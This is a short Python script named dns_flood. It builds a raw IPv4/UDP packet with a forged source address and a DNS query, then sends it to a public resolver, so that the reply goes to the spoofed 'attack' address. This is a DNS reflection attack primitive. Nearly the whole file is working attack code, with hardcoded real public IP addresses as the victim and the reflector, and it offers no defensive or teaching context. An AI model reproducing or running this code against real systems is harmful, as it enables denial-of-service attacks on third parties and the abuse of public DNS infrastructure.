from socket import *
import struct

def dns_flood(attack_addr :str, attack_port :int, dns_addr :str, dns_port :int):
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
    raw_socket.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
    
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        0x45, # Version
        0x00, # Differentiated Services Field
        0x003e, # Total Length
        0x0000, # Identification
        0x0000, # Flags and Offset
        0x40, # Time to Live
        0x11, # Protocol: UDP
        0x0000, # Header Checksum
        inet_aton(attack_addr), # attack ipv4 address
        inet_aton(dns_addr) # DNS ipv4 address
    )
    udp_header = struct.pack(
        '!HHHH',
        attack_port, # attack ipv4 port
        dns_port, # DNS ipv4 port
        0x002a, # Length
        0x0000, # Checksum
    )
    data = b',V\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01a\x01w\x08bilicdn1\x03com\x00\x00\x1c\x00\x01'

    packet = ip_header + udp_header + data

    print(packet)
    raw_socket.sendto(packet, (dns_addr, dns_port))

    raw_socket.close()

dns_flood('8.8.8.8', 45015, '223.6.6.6', 53)

